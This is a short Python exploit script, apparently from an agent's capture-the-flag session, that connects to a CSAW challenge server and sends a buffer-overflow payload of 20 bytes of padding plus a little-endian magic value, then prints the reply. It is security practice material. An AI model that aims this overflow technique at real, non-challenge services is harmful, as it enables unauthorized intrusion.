import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwn.chal.csaw.io', 1436))
initial = s.recv(1024)
print("Initial (hex):", initial.hex())

# Send payload: 20 bytes padding + 0xcaf3baee in little-endian
payload = b'A' * 20 + struct.pack('<I', 0xcaf3baee)
print("Payload (hex):", payload.hex())
s.send(payload)

# Receive response with timeout
s.settimeout(2)
try:
    response = s.recv(1024)
    print("Response length:", len(response))
    print("Response (hex):", response.hex())
except Exception as e:
    print("Error:", e)
finally:
    s.close()
end_of_edit

